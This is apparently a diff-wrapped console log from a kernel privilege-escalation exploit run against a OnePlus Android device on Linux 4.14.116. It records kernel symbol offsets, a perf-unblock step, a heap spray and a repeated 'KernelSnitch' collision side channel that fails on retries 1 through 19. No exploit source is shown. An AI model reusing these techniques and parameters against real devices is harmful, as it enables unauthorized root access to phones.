@@ -1,0 +1,301 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffff8002f640b0
+[32m[+] [0mstartup context pid=7169 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=7169 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=7169 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=7169 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0m=== W1c: perf unblock === target=0xffffff8002f421e8 mode=1
+[33m[*] [0m[T+4ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f1a4c8[33m[*] [0m  0000006b95f74798[33m[*] [0m  0000006b95fdbad0[33m[*] [0m  0000006b9605ced8[33m[*] [0m  0000006b96149640[33m[*] [0m  0000006b961e5b20[33m[*] [0m  0000006b962cd260[33m[*] [0m  0000006b962d1280[33m[*] [0m  0000006b962e02f8[33m[*] [0m  0000006b962ee368[33m[*] [0m  0000006b963003f8[33m[*] [0m  0000006b96310478[33m[*] [0m  0000006b963154a0[33m[*] [0m  0000006b963184b8[33m[*] [0m  0000006b96321500[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 1/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ea6128[33m[*] [0m  0000006b95ed82b8[33m[*] [0m  0000006b95f30578[33m[*] [0m  0000006b96033d90[33m[*] [0m  0000006b96057eb0[33m[*] [0m  0000006b960ca248[33m[*] [0m  0000006b9610a448[33m[*] [0m  0000006b9611f4f0[33m[*] [0m  0000006b961b89b8[33m[*] [0m  0000006b96240df8[33m[*] [0m  0000006b962cf270[33m[*] [0m  0000006b962d72b0[33m[*] [0m  0000006b962e4318[33m[*] [0m  0000006b96307430[33m[*] [0m  0000006b9630f470[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 2/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ed1280[33m[*] [0m  0000006b95f43610[33m[*] [0m  0000006b95f48638[33m[*] [0m  0000006b95faa948[33m[*] [0m  0000006b95fab950[33m[*] [0m  0000006b95ffdbe0[33m[*] [0m  0000006b96039dc0[33m[*] [0m  0000006b960c2208[33m[*] [0m  0000006b9610b450[33m[*] [0m  0000006b9616b750[33m[*] [0m  0000006b9618d860[33m[*] [0m  0000006b961a4918[33m[*] [0m  0000006b96207c30[33m[*] [0m  0000006b96210c78[33m[*] [0m  0000006b962f73b0[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 3/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95e9c0d8[33m[*] [0m  0000006b95ee6328[33m[*] [0m  0000006b96147630[33m[*] [0m  0000006b9614a648[33m[*] [0m  0000006b9614d660[33m[*] [0m  0000006b961566a8[33m[*] [0m  0000006b9615f6f0[33m[*] [0m  0000006b961787b8[33m[*] [0m  0000006b9617b7d0[33m[*] [0m  0000006b96184818[33m[*] [0m  0000006b96188838[33m[*] [0m  0000006b96191880[33m[*] [0m  0000006b961988b8[33m[*] [0m  0000006b961a8938[33m[*] [0m  0000006b961a9940[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 4/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95fd7ab0[33m[*] [0m  0000006b96012c88[33m[*] [0m  0000006b96062f08[33m[*] [0m  0000006b9618c858[33m[*] [0m  0000006b961c1a00[33m[*] [0m  0000006b961daac8[33m[*] [0m  0000006b961fabc8[33m[*] [0m  0000006b96207c30[33m[*] [0m  0000006b96220cf8[33m[*] [0m  0000006b96246e28[33m[*] [0m  0000006b9626af48[33m[*] [0m  0000006b96287030[33m[*] [0m  0000006b962b0178[33m[*] [0m  0000006b962c9240[33m[*] [0m  0000006b962f63a8[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 5/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ed4298[33m[*] [0m  0000006b95ede2e8[33m[*] [0m  0000006b95f6f770[33m[*] [0m  0000006b95f757a0[33m[*] [0m  0000006b960b71b0[33m[*] [0m  0000006b961c09f8[33m[*] [0m  0000006b962d52a0[33m[*] [0m  0000006b963f4b98[33m[*] [0m  0000006b9646cf58[33m[*] [0m  0000006b965164a8[33m[*] [0m  0000006b9651d4e0[33m[*] [0m  0000006b96534598[33m[*] [0m  0000006b96550678[33m[*] [0m  0000006b965566a8[33m[*] [0m  0000006b9657f7f0[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 6/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f07430[33m[*] [0m  0000006b95f6e768[33m[*] [0m  0000006b960b3190[33m[*] [0m  0000006b961e3b10[33m[*] [0m  0000006b961fdbe0[33m[*] [0m  0000006b96221d00[33m[*] [0m  0000006b96266f28[33m[*] [0m  0000006b9626df60[33m[*] [0m  0000006b96277fb0[33m[*] [0m  0000006b96289040[33m[*] [0m  0000006b9628e068[33m[*] [0m  0000006b96294098[33m[*] [0m  0000006b962960a8[33m[*] [0m  0000006b962980b8[33m[*] [0m  0000006b9629e0e8[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 7/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f52688[33m[*] [0m  0000006b95ff6ba8[33m[*] [0m  0000006b96078fb8[33m[*] [0m  0000006b9608f070[33m[*] [0m  0000006b960a1100[33m[*] [0m  0000006b960d82b8[33m[*] [0m  0000006b961375b0[33m[*] [0m  0000006b961d7ab0[33m[*] [0m  0000006b96203c10[33m[*] [0m  0000006b9620ac48[33m[*] [0m  0000006b96213c90[33m[*] [0m  0000006b96220cf8[33m[*] [0m  0000006b96229d40[33m[*] [0m  0000006b96245e20[33m[*] [0m  0000006b96263f10[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 8/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f1e4e8[33m[*] [0m  0000006b95f5f6f0[33m[*] [0m  0000006b95f6f770[33m[*] [0m  0000006b9617f7f0[33m[*] [0m  0000006b9620fc70[33m[*] [0m  0000006b9627efe8[33m[*] [0m  0000006b962e02f8[33m[*] [0m  0000006b962fd3e0[33m[*] [0m  0000006b96308438[33m[*] [0m  0000006b9630c458[33m[*] [0m  0000006b96310478[33m[*] [0m  0000006b96314498[33m[*] [0m  0000006b96321500[33m[*] [0m  0000006b96323510[33m[*] [0m  0000006b9632e568[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 9/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ef0378[33m[*] [0m  0000006b95feeb68[33m[*] [0m  0000006b96019cc0[33m[*] [0m  0000006b96052e88[33m[*] [0m  0000006b9608d060[33m[*] [0m  0000006b96090078[33m[*] [0m  0000006b960ab150[33m[*] [0m  0000006b960b51a0[33m[*] [0m  0000006b960b81b8[33m[*] [0m  0000006b961184b8[33m[*] [0m  0000006b9611d4e0[33m[*] [0m  0000006b961365a8[33m[*] [0m  0000006b961395c0[33m[*] [0m  0000006b961596c0[33m[*] [0m  0000006b961a08f8[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 10/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95fc4a18[33m[*] [0m  0000006b95fc6a28[33m[*] [0m  0000006b95ff6ba8[33m[*] [0m  0000006b96042e08[33m[*] [0m  0000006b961405f8[33m[*] [0m  0000006b96384818[33m[*] [0m  0000006b963998c0[33m[*] [0m  0000006b963ab950[33m[*] [0m  0000006b963bd9e0[33m[*] [0m  0000006b9641ece8[33m[*] [0m  0000006b9642dd60[33m[*] [0m  0000006b96459ec0[33m[*] [0m  0000006b964d82b8[33m[*] [0m  0000006b964fb3d0[33m[*] [0m  0000006b964fe3e8[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 11/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95fe7b30[33m[*] [0m  0000006b96068f38[33m[*] [0m  0000006b96072f88[33m[*] [0m  0000006b96074f98[33m[*] [0m  0000006b96079fc0[33m[*] [0m  0000006b960a4118[33m[*] [0m  0000006b9617d7e0[33m[*] [0m  0000006b96210c78[33m[*] [0m  0000006b96212c88[33m[*] [0m  0000006b9621ece8[33m[*] [0m  0000006b9622ad48[33m[*] [0m  0000006b9622bd50[33m[*] [0m  0000006b96231d80[33m[*] [0m  0000006b96232d88[33m[*] [0m  0000006b9623dde0[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 12/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ea4118[33m[*] [0m  0000006b95ece268[33m[*] [0m  0000006b95f1d4e0[33m[*] [0m  0000006b95fa6928[33m[*] [0m  0000006b96053e90[33m[*] [0m  0000006b960ca248[33m[*] [0m  0000006b960cb250[33m[*] [0m  0000006b96110478[33m[*] [0m  0000006b96150678[33m[*] [0m  0000006b961c7a30[33m[*] [0m  0000006b96219cc0[33m[*] [0m  0000006b9621bcd0[33m[*] [0m  0000006b96220cf8[33m[*] [0m  0000006b96224d18[33m[*] [0m  0000006b9622ad48[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 13/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ed3290[33m[*] [0m  0000006b96011c80[33m[*] [0m  0000006b96016ca8[33m[*] [0m  0000006b9606ef68[33m[*] [0m  0000006b96080ff8[33m[*] [0m  0000006b96124518[33m[*] [0m  0000006b9616d760[33m[*] [0m  0000006b961b3990[33m[*] [0m  0000006b96218cb8[33m[*] [0m  0000006b96227d30[33m[*] [0m  0000006b96228d38[33m[*] [0m  0000006b96233d90[33m[*] [0m  0000006b96238db8[33m[*] [0m  0000006b96245e20[33m[*] [0m  0000006b9624ae48[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 14/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95edc2d8[33m[*] [0m  0000006b95f43610[33m[*] [0m  0000006b95f7d7e0[33m[*] [0m  0000006b95f83810[33m[*] [0m  0000006b95f84818[33m[*] [0m  0000006b95fc09f8[33m[*] [0m  0000006b9604ee68[33m[*] [0m  0000006b9605dee0[33m[*] [0m  0000006b96089040[33m[*] [0m  0000006b96092088[33m[*] [0m  0000006b9609c0d8[33m[*] [0m  0000006b960a2108[33m[*] [0m  0000006b960b4198[33m[*] [0m  0000006b961184b8[33m[*] [0m  0000006b961ac958[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 15/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f82808[33m[*] [0m  0000006b962af170[33m[*] [0m  0000006b96312488[33m[*] [0m  0000006b963a5920[33m[*] [0m  0000006b963f0b78[33m[*] [0m  0000006b963f3b90[33m[*] [0m  0000006b963f5ba0[33m[*] [0m  0000006b963fabc8[33m[*] [0m  0000006b96403c10[33m[*] [0m  0000006b9640cc58[33m[*] [0m  0000006b96411c80[33m[*] [0m  0000006b96419cc0[33m[*] [0m  0000006b9642dd60[33m[*] [0m  0000006b9644ee68[33m[*] [0m  0000006b9644fe70[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 16/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95ece268[33m[*] [0m  0000006b95f03410[33m[*] [0m  0000006b95f1f4f0[33m[*] [0m  0000006b95f73790[33m[*] [0m  0000006b95f9f8f0[33m[*] [0m  0000006b9602ad48[33m[*] [0m  0000006b9605fef0[33m[*] [0m  0000006b9607fff0[33m[*] [0m  0000006b960e7330[33m[*] [0m  0000006b960f83b8[33m[*] [0m  0000006b9613e5e8[33m[*] [0m  0000006b961596c0[33m[*] [0m  0000006b961978b0[33m[*] [0m  0000006b961cfa70[33m[*] [0m  0000006b961f4b98[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 17/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b96083010[33m[*] [0m  0000006b960c4218[33m[*] [0m  0000006b960c5220[33m[*] [0m  0000006b96102408[33m[*] [0m  0000006b961ac958[33m[*] [0m  0000006b9624be50[33m[*] [0m  0000006b96250e78[33m[*] [0m  0000006b96258eb8[33m[*] [0m  0000006b9625dee0[33m[*] [0m  0000006b96263f10[33m[*] [0m  0000006b9627bfd0[33m[*] [0m  0000006b96282008[33m[*] [0m  0000006b9628d060[33m[*] [0m  0000006b96293090[33m[*] [0m  0000006b9629b0d0[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 18/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f49640[33m[*] [0m  0000006b95fa1900[33m[*] [0m  0000006b960b81b8[33m[*] [0m  0000006b960c6228[33m[*] [0m  0000006b960f83b8[33m[*] [0m  0000006b9611b4d0[33m[*] [0m  0000006b9611e4e8[33m[*] [0m  0000006b9612a548[33m[*] [0m  0000006b961385b8[33m[*] [0m  0000006b9613d5e0[33m[*] [0m  0000006b9614d660[33m[*] [0m  0000006b96151680[33m[*] [0m  0000006b96165720[33m[*] [0m  0000006b9616b750[33m[*] [0m  0000006b9616e768[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 19/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f64718[33m[*] [0m  0000006b9602bd50[33m[*] [0m  0000006b9603dde0[33m[*] [0m  0000006b960960a8[33m[*] [0m  0000006b960a2108[33m[*] [0m  0000006b960be1e8[33m[*] [0m  0000006b960fb3d0[33m[*] [0m  0000006b9610e468[33m[*] [0m  0000006b9611e4e8[33m[*] [0m  0000006b9616c758[33m[*] [0m  0000006b9619e8e8[33m[*] [0m  0000006b961ae968[33m[*] [0m  0000006b961b1980[33m[*] [0m  0000006b961b69a8[33m[*] [0m  0000006b961bd9e0[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
